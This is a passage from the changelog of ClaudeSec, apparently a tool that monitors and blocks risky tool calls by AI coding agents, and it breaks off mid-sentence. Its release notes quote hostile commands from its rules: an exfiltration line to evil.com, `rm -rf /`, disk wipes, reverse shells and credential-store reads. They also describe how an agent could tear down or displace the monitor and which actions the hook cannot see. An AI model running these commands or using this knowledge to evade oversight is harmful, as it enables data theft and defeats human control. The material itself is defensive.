# Changelog

All notable changes to ClaudeSec are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **The container image builds again.** 2.0.0 was tagged and released, but its
  image never reached the registry. The image build runs `pnpm build` as root,
  `prebuild` chains the full test suite, and one case in the legacy-database
  migration test simulates an interrupted move by making the target directory
  unwritable. Root ignores directory permission bits, so the move completed, no
  interruption occurred, and every assertion in that case inverted. The case is
  now skipped under uid 0 — with a line saying why, so the skip is not mistaken
  for a weakened test — and runs in full for everyone else. If you run ClaudeSec
  as a container, 2.0.1 is the first 2.x image you can pull.

### Build

- **`better-sqlite3` 12.11.1 → 13.0.3.** 13.0.0 rebuilds the driver on N-API.
  The JavaScript API is unchanged and the release only adds `db.explain()` and
  `stmt.toString()`, but the binding layer underneath is new code, so the audit
  chain was re-verified against it: 500 chained spans verify deep with a signed,
  attested anchor, and an out-of-band edit to a row in the middle is still caught
  as a mismatch at that exact position. 13.x also ships musl prebuilds inline,
  so the Alpine image no longer depends on fetching one at install time.
- **`motion` 12.40.0 → 13.1.0.** The one breaking change in 13.0.0 drops the
  optional `@emotion/is-prop-valid` integration, which this project does not
  install, and the built-in prop filter it falls back to is unchanged.
- **The npm dependency group moves up 15 packages**, every one of them within
  its current major.

### Security

- **Workflow actions are pinned to commit SHAs.** `pnpm/action-setup` and
  `github/codeql-action` were pinned to the SHAs of their *annotated tag
  objects*, which an upstream maintainer can delete and recreate. They now point
  at the commits those tags resolve to, which cannot be moved.

## [2.0.0] - 2026-08-16

### Upgrade notes

**This is a major release and it changes behaviour you are relying on.** Read this
list before upgrading. The first three are about where your data lives, and one of
them is data loss for a specific group of Docker users. After those, the two you
will hit within a minute of starting the new build: the dashboard will not save
anything until you pair it, and the enforcement floor now refuses control-plane
writes in **monitor** mode as well as `enforce`.

- **Your database moves out of the checkout, once, automatically.** Through 1.3.0
  the default path was a bare `spans.db`, which SQLite resolved against the
  working directory, so it sat wherever you started the server from — normally
  your clone. It now defaults to `~/.claudesec/spans.db`, and on first start a
  pre-2.0 database found in the checkout is **moved** there. The move only
  happens when all of these hold: the new location is empty, `CLAUDESEC_DB` is
  unset, the file is a real SQLite database, and no other ClaudeSec process holds
  its write lock. If any of them fails, nothing is touched and the server logs one
  line saying which condition stopped it. The move is atomic — the database is
  checkpointed into a single file first, then renamed — so an interruption leaves
  the original intact. Across a filesystem boundary a rename is not possible, so it
  copies instead and **deliberately leaves the original in place** for you to check
  and delete yourself. Your spans, sessions, alerts and hash chain are unchanged: a
  rename moves a directory entry and cannot alter a byte, and the one write involved
  is a WAL checkpoint, which relocates already-committed pages without changing any
  row. To keep the database where it is, set `CLAUDESEC_DB` to its current path
  before you start.
- **Docker: if you built from a development commit, your data and your audit
  signing key are stranded in the container.** Anyone who built an image from
  `master` or `feat/launch-hardening` between 2026-06-15 and this release
  has their database **and** their Ed25519 audit signing key written to
  `/home/node/.claudesec/` inside the container's writable layer, which is not on
  any volume. **This release does not recover them.** Before you upgrade, copy
  them out yourself:

  ```bash
  docker cp claudesec:/home/node/.claudesec/spans.db ./spans.db
  docker cp claudesec:/home/node/.claudesec/hooks ./claudesec-hooks
  ```

  Then place them under the `claudesec-data` volume at `/data/spans.db` and
  `/data/claudesec/hooks`. If you skip this, removing the old container destroys
  both, and without the signing key the existing chain can never be verified
  again. **Upgrading from the released 1.3.0 image is unaffected** — that data is
  already at `/data/spans.db`, which is exactly where the new configuration
  points.
- **Back up `CLAUDESEC_HOME` together with the database.** `~/.claudesec` (or
  wherever `CLAUDESEC_HOME` points) now holds the Ed25519 audit signing key, the
  signed tail anchor, and the control-plane pairing key. **The hash chain cannot
  be verified without the signing key**, so a backup of `spans.db` on its own is
  no longer a complete backup of the record. Under Docker both live in the
  `claudesec-data` volume. One caveat if you replace that named volume with a host
  bind mount on macOS or Windows: the file-sharing layer synthesises permissions
  and can silently drop the `0600` mode ClaudeSec sets on the database.
- **The dashboard must be paired once before it can change anything.** Reads over
  loopback are still open and need no token, but a **mutation** (changing the
  enforcement mode, editing rules, saving settings) now requires a control token.
  Run **`claudesec open`** once: it launches the dashboard with a one-time pairing
  key and the server exchanges that for an `HttpOnly`, `SameSite=Strict` cookie
  lasting 90 days. Until you do, an already-open tab or a plain
  `localhost:3000` bookmark gets `403` on every save. Scripts and `curl` against a
  mutating route need the key from `~/.claudesec/hooks/control-token` or
  `CLAUDESEC_TOKEN`. Docker with `CLAUDESEC_TRUST_LOCAL=1` is unaffected.
- **The self-protection floor blocks writes to the enforcement control plane in
  every mode, including `monitor`.** It also now refuses ClaudeSec's own teardown
  commands — `uninstall-hook`, `uninstall`, `stop` — when an agent invokes them.
  Run those from your own terminal instead; a PreToolUse hook only ever sees an
  agent's tool calls, so your shell is unaffected. `install-hook` is deliberately
  never blocked. In the other direction the floor is now narrower: it keys on the
  **write**, so reading, grepping or diffing a control-plane file is allowed where
  it used to be denied.
- **Nine SQL keyword rules moved from `high` to `medium`.** `high` and `critical`
  bake to "refuse the command", so a rule that matches the *mention* of a
  destructive statement was refusing `grep -i "drop table" migrations/*.sql` and
  commit messages. A new `high` rule covers the **act** — a destructive statement
  behind an actual database client. If you relied on `enforce` to block a bare
  `DROP TABLE` string appearing in text, that no longer blocks.
- **Retention defaults changed, and Docker's differ from the server's.** The
  server's built-in default for `CLAUDESEC_MAX_SPANS` is now `1000000` (was
  `50000`), paired with the unchanged 183-day window as the **Minimum** profile.
  That is what you get from a clone. The bundled `docker-compose.yml` does not use
  it: it sets `CLAUDESEC_MAX_SPANS=200000` and `CLAUDESEC_RETENTION_DAYS=30`
  explicitly, sized so a 30-day window holds at up to ~6,000 spans a day. Both are
  overridable from your environment or a `.env` file, so set them to `1000000` and
  `183` if you want the six-month profile in a container. A value you set
  explicitly — by environment variable or in the dashboard — is left exactly as it
  was. Also, `0` now means **unbounded** for both retention knobs; it previously
  fell through to the default.
- **The sequence engine is on for everyone, with no flag.** Ten multi-step
  correlation rules now run alongside the single-span rules, so a new class of
  alert can appear without any configuration change. They alert only — sequence
  findings never block.
- **`GET /api/search` now rejects an unparseable `from`/`to` date with `400`**
  instead of silently dropping the filter. A client passing a malformed date was
  getting the whole table back while the response looked filtered.
- **Expect more anomaly alerts.** A timestamp-comparison defect made every
  dedup window behave like 24 hours, and the threat-burst rule read the "last ten
  spans" from an unordered query so it almost never fired. Both are fixed, so
  these rules now fire as documented.
- **Cost input-token totals may drop.** Rows ingested before the OTLP cache-token
  split, which carry no cache-read key at all, are now excluded from input totals
  rather than counted as raw input. Output tokens are unchanged, and the excluded
  volume is reported alongside the total.
- **⌘K now opens a global command palette** (go to a view, saved views, sessions,
  repositories, docs, preferences) rather than docs search. Docs are still
  searchable by title and description from it, but no longer by phrases in a
  page's body.
- **Search returns partial results for a moment on first start after upgrade.**
  The full-text index is rebuilt in the new external-content layout. The rebuild
  is chunked and resumable, and a partially-built index only ever under-matches —
  it never returns a wrong row.
- **Three views were removed:** graph replay, the graph's own search box, and the
  context sidebar. See **Removed** below for what covers each of them now.

### Added

- **A control token for the local control plane.** Mutating `/api` routes now
  require a pairing key that the server will **never** hand out in response to an
  HTTP request. A loopback TCP connection carries no user or process identity, so
  nothing in a request can distinguish your dashboard from anything else on the
  machine — the previous design issued the cookie to any loopback `GET` whose
  headers looked like a browser's, which `curl -H 'Sec-Fetch-Dest: document'`
  could claim for itself. The key is 32 random bytes, stored `0600` under the
  self-protected hooks directory, and delivered out of band by `claudesec open`.
  This closes mutation-over-HTTP completely. It does **not** close the same-user
  ceiling: a process running as you can read that file, and only a separate OS
  user changes that.
- **Signed evidence packs.** `GET /api/governance/evidence` returns a
  downloadable pack — a manifest plus the alert, enforcement, and audit-log rows
  behind every policy status — signed with **Ed25519** over a canonical
  serialization whose recipe is printed inside the pack. The public key is served
  at `GET /api/audit/public-key`, so a recipient can verify without being able to
  forge, which an HMAC could not offer. An export never mints a signing identity:
  with no key present the pack is still returned, marked unsigned.
- **A signed tail anchor over the audit record.** Row hashes are now keyless
  SHA-256 so anyone can recompute them, and the boundaries a chain cannot see
  about itself — how many rows there should be, and where the chain ends — live
  in an Ed25519-signed anchor file kept outside the database. `GET
  /api/audit/verify` now distinguishes `ok`, `row_mismatch`, `truncated`,
  `wiped`, `tail_mismatch`, `anchor_missing`, `anchor_unsigned` and `unanchored`
  instead of one pass/fail. The spans ledger itself is chained for the first time,
  and a deleted span leaves a ~160-byte **tombstone** carrying its chain link, so
  retention destroys the data without destroying the evidence that it existed.
  Retention pruning of the two capped logs **re-anchors** the survivors, so a
  pruned-but-intact log verifies as intact rather than as tampered. Rows written
  by the previous HMAC scheme still verify and are counted separately, because
  those are exactly the rows an outside party cannot check without the local
  secret. This is detection, never prevention, and it can never prove
  completeness — an event that was never written leaves no residue. A key held on
  this machine also does not bind this machine's owner; what the signature buys is
  that nobody else can forge the record.
- **Optional external anchoring, off by default.** Set
  `CLAUDESEC_ANCHOR_METHOD=tsa` (RFC 3161) or `=ots` (OpenTimestamps) to have an
  independent third party timestamp the anchor, so its creation time can't be
  backdated by whoever controls the host. Off unless you set it, because it is an
  outbound call. It is the **fourth** optional egress path, alongside
  `OTEL_FORWARD_URL`, `CLAUDESEC_WEBHOOK_URL` and `CLAUDESEC_JUDGE_URL`. Only the
  32-byte hash leaves the machine: never span content, commands, file paths, or
  repository names. `CLAUDESEC_ANCHOR_TSA_URL`, `CLAUDESEC_ANCHOR_OTS_URL`,
  `CLAUDESEC_ANCHOR_INTERVAL_MS` and `CLAUDESEC_ANCHOR_TIMEOUT_MS` choose the
  endpoint and the cadence. The TSA certificate
  chain is **not** validated and an OpenTimestamps `receipted` status means a
  calendar acknowledged the digest, not that Bitcoin confirmed it — the raw
  receipts are kept so `openssl ts -verify` and the official `ots` client can do
  the layers ClaudeSec does not.
- **A Govern tab.** Twelve plain-language policies ("agents must not read
  credential stores", "no destructive commands") evaluated against your own alert
  and enforcement history, each reporting **Held**, **Violated** or **Not
  provable**. The third status exists on purpose, for when nothing was watching
  rather than nothing happened. No score and no percentage. It adds no detection
  and no enforcement — every fact it reports already existed elsewhere; this only
  groups them into statements a human can read. Coverage is stated in numbers
  rather than implied: roughly 10 of 72 NIST AI RMF subcategories, 7 of 38
  ISO/IEC 42001 Annex A controls, and **zero** of the mandatory ISO clauses 4–10,
  which are organizational and no runtime observer can satisfy.
- **An enforcement impact preview.** `GET /api/enforce/impact?days=N` replays the
  tool calls already in your database through the same evaluator the hook and the
  MCP proxy use, and the Enforce tab shows the result before you touch the
  toggle. It separates two populations that mean different things: what flipping
  to `enforce` would *additionally* deny, and what the always-on floors deny
  **today** in monitor mode. Rules are ranked by frequency with real (scrubbed)
  example commands, because the total is rarely actionable and the distribution
  almost always is. Read-only — it opens no transaction and writes no row.
- **Retention profiles.** `Minimum` (183 days / 1,000,000 spans, the default),
  `Audit year` (400 / 5,000,000), `Forensic` (unbounded), or `Custom`. The two
  limits only mean what they say when they agree: pruning may only reclaim spans
  already outside the age window, so a ceiling smaller than the window's own
  volume cannot shorten the window — it stops new data arriving, permanently, when
  ingestion pauses at 90% of the ceiling. `GET /api/db-stats` now reports the
  **effective window** at your own measured ingest rate, which limit governs, and
  whether an environment variable is overriding a value you saved.
- **A deployment-drift gate.** `install-hook` deploys a *snapshot*, so editing
  `cli/hooks/` changes nothing about what Claude Code actually executes — a stale
  copy still runs, still exits 0, still writes to the feed, and enforces an older
  rule set. `scripts/check-deployed-hook.mjs` (now part of `pnpm preflight`)
  finds every registered hook the way Claude Code does, compares it by SHA-256,
  and on a mismatch reports which floor patterns the deployed copy is missing. A
  machine with nothing registered passes; a hook registered but *missing* fails,
  because that is enforcement silently switched off.
- **A stateful sequence engine.** Reading `.env` is ordinary. Running `curl -X
  POST` is ordinary. Doing both ninety seconds apart is an exfiltration chain no
  single-span pattern can express. Ten rules correlate ordered steps within a
  session — credential read then off-box upload, archive staged then uploaded, git
  hook installed then triggered, history erased after credential activity — and
  the alert's `matchedText` carries the whole rendered chain rather than one
  excerpt. Bounded in memory, cheap on the ingest path, and tuned against real
  history: templates are not secrets, a GET is not an upload, loopback is not
  off-box, and a heredoc body is a file rather than a command.
- **Sub-agent lineage.** Spans produced by a delegated agent now carry the agent's
  id and type, and the call that launched it records the id it spawned — so the
  orchestration view can say "the code-reviewer agent, which the session launched
  at 14:02, ran this command" instead of "something ran this command". A
  delegated agent reuses its parent's session id, so the link comes from the
  launch record rather than a session lookup. `CLAUDESEC_LINEAGE_BACKFILL=1`
  reconstructs lineage for older spans as a **read-only** query-time overlay —
  `parentId` is covered by the hash chain, so rewriting it retroactively would
  make an untouched history report as tampered.
- **The audit signing key can move into the macOS Keychain.** `claudesec
  audit-key status | to-keychain | to-file`. Opt-in, macOS only, and nothing
  migrates automatically: `to-keychain` proves a sign/verify round-trip before it
  changes anything, and renames the key file rather than deleting it. With the
  default login keychain this is relocation, not confidentiality — the gain is
  that the key is no longer a file an ordinary `rm` removes. Linux, Docker and CI
  never touch this path.
- **Filterable graph data and paged sessions.** `GET /api/graph` accepts the same
  `repo`/`sev`/`harness`/`t`/`q` keys the dashboard's own filters use and reports
  `windowed`/`shown`/`total`/`limit`, and `GET /api/sessions` accepts `limit` and
  `offset`. Both are additive — paging is opt-in, and omitting the parameters
  returns everything exactly as before. A new `GET /api/repos` returns the
  per-repository roll-up the repository tree is built from.
- **A rebuilt dashboard shell.** A new navigation rail, category panels, a
  repository tree, a persistent detail pane on wide screens, and a global command
  palette. Filter state now lives in the URL (`q`, `sev`, `repo`, `harness`, `t`),
  so a filtered view is bookmarkable and shareable. New shortcuts: `⌘B` toggles
  the rail, `⌘]` toggles the detail pane. Underneath, the interface moved onto a
  shared token-based design system, so spacing, colour, and every control's
  appearance are defined in one place instead of per screen. Three views were
  removed in the process: see **Removed** below.

- **Enforcement now blocks actions, not edits.** For an `Edit` or `Write`, the
  hook decides on the **file path and the action** — checked against your
  protected paths plus a tiny, high-confidence live-secret check on the content —
  instead of scanning the whole file body against the rule library. Editing
  security code, attack-pattern docs, or secret-shaped test fixtures no longer
  trips a block. `Bash` is still matched in full, and the dashboard's threat
  detection still inspects complete content, so visibility is unchanged.
- **SSRF protection on agent fetches.** With the hook installed, a Claude Code
  `WebFetch` to a cloud-metadata or link-local address (`169.254.169.254`, the
  GCP metadata hostnames, IPv6 link-local) is blocked in either mode, and
  loopback / private ranges are blocked in `enforce` — set
  `CLAUDESEC_ALLOW_LOCAL_FETCH=1` to allow a local dev server. The check is
  synchronous and matches the literal host, so a public name that resolves to an
  internal IP (DNS rebinding) is not caught here — the server-side SSRF guard,
  which resolves every host, remains the backstop for the paths it controls.
- **The SSRF floor now covers the MCP proxy too.** The same fetch-SSRF guard is
  enforced server-side in the cross-agent MCP proxy, so a non-Claude-Code agent
  (Codex, Copilot, Claude Desktop) routed through the proxy is also blocked from
  reaching internal / cloud-metadata hosts via a fetch-shaped `tools/call`.
- **The MCP proxy blocks catastrophic commands like the hook does.** The proxy
  now extracts the **raw command** from a command-shaped `tools/call` (instead of
  matching the serialized JSON blob), so the catastrophic floor's
  boundary-anchored patterns fire on a cross-agent `rm -rf /` exactly as they do
  on the hook. A behavioral parity test pins the proxy's verdicts to the hook's.
- **Default protected paths.** The protected-path floor now ships a small,
  conservative, user-removable default set so a fresh install protects the
  high-value credential stores out of the box: `~/.ssh`, `~/.aws/credentials`,
  `~/.config/gcloud`, `~/.kube/config`, `~/.npmrc`, and `.env`-style secret files
  (with `.env.example` / `.sample` / `.template` carve-outs). Your own entries
  merge on top, and any default can be removed.
- **The enforcement feed survives restart.** What used to be an in-memory ring
  buffer is now persisted to a capped SQLite table (the most recent 500 events),
  so the Enforce tab's history isn't lost when the server restarts.
- **Database backups.** A consistent binary snapshot of the database is written
  to `~/.claudesec/backups/` shortly after boot and daily thereafter (owner-only,
  most recent 7 kept) — a drop-in `.db` you can restore by pointing
  `CLAUDESEC_DB` at it. This is separate from the hourly JSON export.

### Changed

- **Enforcement got much more accurate.** The rule set was re-tuned against a
  replay of real recorded history rather than judgement, and `enforce` mode now
  denies **76% fewer** ordinary developer commands — 698 would-be denials over the
  measurement window became 167. This came from **tightening patterns**, not from
  downgrading severities wholesale, so detection coverage is not reduced. Commands
  that were being refused and should not have been include: a local Supabase or
  Docker Postgres connection on `127.0.0.1` using the framework's own default
  password (318 of those 698 denials on its own);
  `curl … | python3 -c '(an inline JSON parser)'`, where the download is data
  rather than the program; `grep -i
  "drop table" migrations/*.sql`; reading a LaunchAgent plist to check whether
  your own service is installed; and `rm -rf node_modules` inside a home
  directory, from a word-boundary defect.
- **Severity is treated as a shipping decision, not a label.** `high` and
  `critical` bake to "refuse the command", so the library now separates the
  **act** from the **mention**: a pattern that would match its own keyword inside
  a `grep` argument, a commit message or a migration under review sits at
  `medium` — fully detected, on the alert feed and in the audit trail, but never a
  refusal — while a pattern anchored on the thing actually happening carries
  `high`. Both sides of each pairing are pinned by the rule self-test, so a later
  "let's make this stricter" edit cannot quietly turn an alert into a refusal.
- **673 built-in rules** (194 core + 479 extra), up from 639. The new rules cover
  ClaudeSec's own control plane, credential staging and anti-forensics (copying a
  credential store elsewhere, archiving one, reading `/proc/<pid>/environ`,
  writing a shell startup file), execution surfaces that had no coverage at all
  (AppleScript/`osascript`, Perl socket one-liners, git-hook writes, SSH reverse
  and dynamic port forwards, the SUID bit), and destructive or exfiltrating forms
  that were expressible but unmatched (raw disk wipes, find-based root deletion,
  download-then-execute chains, and a new `critical` for a credential-named
  environment variable sent in a request body).
- **A span is now scored by the worst rule it trips, not the first one in file
  order.** `cp -R ~/.ssh/ /tmp/backup/` used to be recorded as a `low` "SSH
  directory access". Enforcement was never affected — the hook only ever
  evaluates rules already marked as blocking — so this is a correction to what the
  dashboard tells you, not to what gets refused.
- **A large performance pass.** Six narrow indexes on `spans` were replaced with
  four composites shaped after the queries that actually run, plus three
  deliberately-kept narrow exceptions where the composite-only set measurably
  regressed a real query. The session list no longer re-scans the spans table once
  per row, live activity became a bounded per-harness lookup instead of a
  whole-table scan, and behavioural anomaly detection moved from loading every span
  in a session and parsing its JSON in Node to SQL aggregates. The full-text index
  became an FTS5 **external-content** index, so it no longer stores a second copy
  of every span's text. Cost figures are memoized against a span-table version
  rather than a clock, because a cost number that lags reality is worse than a
  slow one.
- **Stored attribute values are capped at 4 KiB** (`CLAUDESEC_MAX_ATTR_BYTES`).
  Truncation is marked inline, and it **cannot** weaken detection: rules are
  evaluated against the full, uncapped value before anything is stored.
- **An OTLP batch is now one transaction.** 500 spans used to mean 500 separate
  transactions, and a failure part-way left the caller with a `500` and no way to
  know what had landed. The batch is now all-or-nothing, and a rollback says so
  explicitly.
- **There is no `npx` path, and the docs now say so plainly.** ClaudeSec is not
  published to npm, and the `claudesec` name on the public registry belongs to an
  unrelated project by a different author — so `npx claudesec` would download and
  run someone else's code. Install from source or use Docker.
- **A broader, always-on catastrophic floor.** Beyond `rm -rf /` and fork bombs,
  the floor now also blocks `rm --no-preserve-root`, recursive wipes of system
  trees (`/etc`, `/boot`, `/usr`, `/var`) — with developer carve-outs so
  `/usr/local`, the macOS temp dirs (`/var/folders`, `/var/tmp`), and your own
  sub-paths stay allowed — netcat and `/dev/udp` reverse shells, raw-disk
  overwrites and redirects, and the common Windows destructive commands
  (`format`, `diskpart`, `bcdedit`, `del /f /q /s`, `rd /s`, `vssadmin delete
  shadows`, `cipher /w`, `wevtutil cl`). Every pattern is proven linear-time by a
  self-test. This floor is always on, in either mode.
- **Symlink-aware protected paths.** Protected-path checks now resolve the real
  on-disk location (following symlinks, with an existing-ancestor walk for files
  that don't exist yet), so a symlink into a protected tree can't slip past. A
  time-of-check/time-of-use race remains an inherent limit of any pre-exec hook.
- **Self-protection now covers project-level settings.** The always-on
  self-protection floor — which stops an agent from editing the enforcement
  control plane — now guards the project-level `./.claude/settings.json` and
  `settings.local.json` (which Claude Code also honors) in addition to the
  home-dir settings, so an agent can't register a competing hook to displace the
  enforcer.
- **A predictable, logged database location.** The database now defaults to an
  absolute `~/.claudesec/spans.db` instead of a bare `spans.db` resolved against
  the working directory, and the resolved path is logged at boot so a
  misconfigured `CLAUDESEC_DB` is obvious. A pre-2.0 database left in a checkout
  is migrated to the new location once, under the conditions described in the
  upgrade notes above. Startup is import-safe (importing the
  server module starts no listener, timers, or config writes;
  `CLAUDESEC_NO_AUTOSTART=1` forces that explicitly), and shutdown is graceful —
  on `SIGTERM`/`SIGINT` the database is checkpointed and closed cleanly, and a
  `busy_timeout` lets a momentarily-contended writer wait rather than fail.
- **Docker persists everything that matters, not just the database.** The image
  now points `CLAUDESEC_DB`, `CLAUDESEC_HOME`, `CLAUDESEC_RULES_FILE` and
  `CLAUDESEC_AUTO_EXPORT_DIR` into `/data`, so the ledger, the audit signing key
  and tail anchor, your custom rules and the hourly exports all live on the
  `claudesec-data` volume and survive an image upgrade. These are set as `ENV` in
  the Dockerfile rather than only in `docker-compose.yml`, so a plain
  `docker run -v claudesec-data:/data` is correct too. The previous arrangement
  symlinked individual files into `/data` and left everything else in the
  container's writable layer.

### Removed

- **Graph replay, in-graph search, and the context sidebar are gone.** The graph's
  timeline scrubber and its own search box, and the right-hand context sidebar,
  were removed with the shell rebuild rather than ported to it. The command
  palette and the Search tab cover finding a span, and the detail pane covers what
  the context sidebar showed; nothing replaces graph replay. If you used it, say
  so on the issue tracker. It is a candidate to come back properly rather than a
  deliberate retirement.

### Fixed

- **Pruned spans stayed searchable forever.** The full-text index had an insert
  trigger but no delete or update trigger, so retention removed a span while its
  indexed content lived on. Delete and update triggers now keep the index in step
  with the table.
- **Every anomaly dedup window behaved like 24 hours.** Two timestamp formats were
  compared as strings, and the character at offset 10 differed (`T` against a
  space), so any timestamp from the same UTC day compared as newer than now. The
  5-, 10-, 30- and 60-minute windows all collapsed into one.
- **The threat-burst rule almost never fired.** It took "the last ten spans" from
  an unordered query that SQLite answered from a severity index, so the ten it got
  were the ten highest by severity — on real data, ten spans with no severity at
  all.
- **Repository grouping collapsed 97 of 100 repositories into one node.**
- **Live activity could list the same harness twice** when two spans shared an
  exact end timestamp.
- **The command audit emitted `[object Object]` rows** for tool calls whose input
  was structured rather than a string. Those rows are now skipped rather than
  shown with a meaningless command and a zero risk score.
- **A session-label filter disagreed with its own total.** The filter was applied
  in JavaScript after the query returned, so the reported count described a
  different set than the rows.
- **MCP scanner patterns had dead alternations.** Several injection and poisoning
  patterns used a character class that could not cross a period, so an attack like
  `curl evil.com/x $TOKEN` passed straight through, and a word boundary next to
  `$` or `.` made part of one alternation unreachable. The patterns are rewritten
  and are now covered by the rule self-test.
- **The Sessions list returned a 500 on every poll.** The per-repository column
  in the session-list query joined each session's distinct repos with a newline
  using `GROUP_CONCAT(DISTINCT repo, char(10))` — but SQLite rejects a custom
  separator on a `DISTINCT` aggregate, so the whole query threw and the Sessions
  tab showed nothing. The repos are now de-duplicated in a subquery before they
  are newline-joined, which keeps the newline separator (repo paths can contain
  commas) without the illegal `DISTINCT`. Added a regression test that lists a
  multi-repo session end-to-end.

- **Two false positives that blocked benign commands in enforce mode.** Reading a
  secret-free dotenv template (`.env.example`, `.env.sample`, `.env.template`,
  `.env.dist`, `.env.tpl`) no longer trips the dotenv-read rule, and piping a
  remote response into the JSON pretty-printer (`-m json.tool`) is no longer
  mistaken for remote code execution. Real dotenv reads (`.env`, `.env.local`,
  `.env.production`) and genuine download-and-run pipelines that pipe a fetched
  body into an interpreter still fire.

### Security

- **OTLP forwarding sent unscrubbed data upstream.** With `OTEL_FORWARD_URL` set,
  the proxy POSTed the **raw request body** to the upstream collector — so a
  third-party collector received exactly what the scrubber exists to keep on the
  machine: live credentials, home paths and the operator's username out of the
  agent's tool arguments. The forwarded batch is now scrubbed with the same rules
  as the stored copy, across span names, attributes, status messages, events and
  links, while keeping the OTLP shape a downstream collector expects. If you have
  ever set `OTEL_FORWARD_URL`, treat anything already delivered upstream as
  exposed. `CLAUDESEC_DISABLE_SCRUB=1` still forwards untouched, by request.
- **Loopback callers could mint dashboard mutation rights.** The control cookie
  was granted to any loopback `GET` whose headers looked like a browser's, and
  headers are chosen by the caller — so three lines of `curl -H` earned the same
  rights as the dashboard, enough to flip `enforce` back to `monitor` or disable
  rules. That heuristic is removed entirely and replaced by out-of-band pairing;
  no request, with any headers, from any client, now yields a usable token.
- **The self-protection floor covers more of the control plane**, including the
  repo's own `cli/hooks/`, any `.claude/hooks/` directory, the service definition
  (launchd plist or systemd unit), stopping or disabling that service by label,
  and ClaudeSec's own teardown commands. An agent that can ask the product to
  remove itself never has to defeat the floor at all. It sees agent tool calls
  only: a program the agent launches, an interactive editor, and `git checkout --`
  are outside what any pre-execution hook can observe, and the detection rules and
  audit record are the backstop for those.
- **Turning protections off is now itself recorded.** New rules alert on
  `CLAUDESEC_HOOKS_BYPASS=1` and `CLAUDESEC_DISABLE_SCRUB=1`, and on enforcement
  teardown run from a plain shell. The teardown rule is `medium` and deliberately
  does not block — the floor already refuses it inside an agent session, so the
  only people left are operators uninstalling software they own. The requirement
  was the record, not the refusal.
- **Two transitive dependencies pinned to their patched releases.** `ws` and
  `undici` are held at fixed versions by a package override until every dependency
  that pulls them in has moved on by itself.

## [1.3.0] - 2026-06-11

### Added

- **The navigation rail now lists every view.** Expanded, each section shows its
  tabs beneath it, so all thirteen screens are reachable at a glance instead of
  only after selecting a category. Collapsed and mobile layouts are unchanged.
- **In-app controls for demo data.** A dismissible banner marks synthetic demo
  data as *not real activity* wherever it appears, and **Settings → Data** gains a
  one-click **Clear demo data** button. That clear is scoped to demo rows, so it
  can never touch real telemetry — which is why it needs no `CLAUDESEC_ALLOW_RESET`
  gate. The full **Clear all data** wipe is now a visible, explained control
  rather than a missing one.
- **API reference for the remaining endpoints.** Seven routes that had no
  reference page — enforcement, rule overrides, the optional LLM judge,
  honeytokens, scrubbing status, the operator audit log, and harness profiles —
  are now documented and added to `openapi.yaml`.
- **Paging through the full audit trail.** The Command Audit and File Access
  panels can now load every recorded command and file, not just the first slice;
  the API gained matching `offset` paging.

### Changed

- **Status labels tell the truth.** The Enforce tab now warns loudly when a
  precedence layer (e.g. `enforce-config.json`) overrides the configured mode, so
  a pressed "Enforce" toggle can't read as active blocking while the hook actually
  runs in monitor. The dashboard footer reads its version from `package.json`
  instead of a hardcoded string, the spawn-tree **inferred** badge explains itself
  in plain words, and the alert badge counts up to `999+`.

### Fixed

- **Token totals reconcile across every surface.** The per-session HTML report,
  the session compare view, and the Prometheus `/metrics` counters summed raw,
  cache-blind tokens that disagreed with the Cost tab (output roughly 50% high
  from duplicate transcript lines). All token totals now share one deduped,
  cache-aware basis, so the report you hand an auditor matches the dashboard.
- **Model pricing is current and resolves correctly.** Per-million rates for the
  latest OpenAI and Google models were refreshed, the GPT-5.4 mini/nano and
  Gemini 2.5 / 3.x entries were added, and a dated model name such as
  `gpt-4o-mini-2024-07-18` now resolves to the most specific rate instead of a
  pricier sibling listed before it.
- **Docs navigation no longer stalls.** Clicking a page in the docs sidebar now
  updates the content immediately — it previously changed the URL but left the old
  page until a manual reload. A doc whose build was replaced under an open tab
  recovers on its own, and a malformed deep link resolves to a valid view instead
  of a silent fallback.
- **Session reports are trustworthy evidence.** The exported report now shows the
  real version and a CRITICAL threat count (it previously hardcoded `v1.0.0` and
  omitted the critical tier), and hourly auto-exports are written with the same
  owner-only (`0600`) permissions as the database.

### Security

- **Local secret & privacy scanner.** A new sub-second `pnpm scan` reads every
  git-tracked file and fails on real credentials or any private leak — home paths,
  personal emails, private tooling directories — before a push. It runs inside
  `pnpm preflight` and as a fast CI step on every push and pull request.

### Build

- **Line endings are pinned to LF.** A new `.gitattributes` keeps the shell
  launcher and the enforcement hook from being rewritten to CRLF on a Windows
  checkout, where a stray carriage return would break the interpreter (on any
  platform). The README gains a Windows section pointing to Docker as the
  recommended path.

## [1.2.2] - 2026-06-11

### Fixed

- The multi-architecture image build failed on the emulated platform: the test
  gate includes wall-clock ReDoS timing assertions, and on a QEMU-emulated CPU
  every pattern exceeds the timing budget. The test gate and frontend build now
  run once on the build platform's native architecture; the per-architecture
  stages only compile native dependencies and assemble the runtime image.

## [1.2.1] - 2026-06-11

### Fixed

- The container image failed to build from a version tag: the Docker build
  context excluded `cli/`, but the build's test gate checks
  `cli/hooks/claudesec-enforce.cjs` for catastrophic-rule parity and fails
  hard when it is missing. The build context now includes `cli/`. The
  runtime image is unchanged — the CLI still does not ship in the container.

### Security

- The Docker build context now excludes all hidden files and directories, so
  VCS, CI, editor, and local tool state can never reach an image layer.

## [1.2.0] - 2026-06-10

### Added

- A `critical` severity tier — a new highest level above `high`, reserved for
  active secret **exfiltration**: a credential, private key, or `.env` being
  transmitted off the machine (piped to `curl`/`wget`/`nc`, `scp`/`rsync`/`sftp`
  to a remote, posted via `requests`, or a key literal in a POST body). A secret
  merely *present* in a file stays `high`; transmission is what escalates to
  `critical`. Sixteen existing transmission rules were promoted and nine new
  exfiltration rules added (25 critical rules total). Critical alerts render with
  a distinct rose badge and are blocked alongside `high` in `enforce` mode.
- Database connection-string scrubbing — inline `user:password@` credentials in
  `mongodb://`, `postgres://`/`postgresql://`, `mysql://`, and `redis://` URLs are
  now redacted before persistence, so a dumped `.env` no longer stores live DB
  passwords. As with every alert, `critical` exfiltration alerts store only the
  scrubbed/redacted matched text — never the live secret.
- One-command enforcement hook install — `node cli/init.mjs install-hook` builds
  the rules snapshot locally from the repo's rule source (no network), copies the
  dependency-free PreToolUse hook to `~/.claudesec/hooks/`, and registers it in
  `~/.claude/settings.json`. Consent is mandatory: the installer prints the exact
  JSON it will write and asks before touching anything, backs up the previous
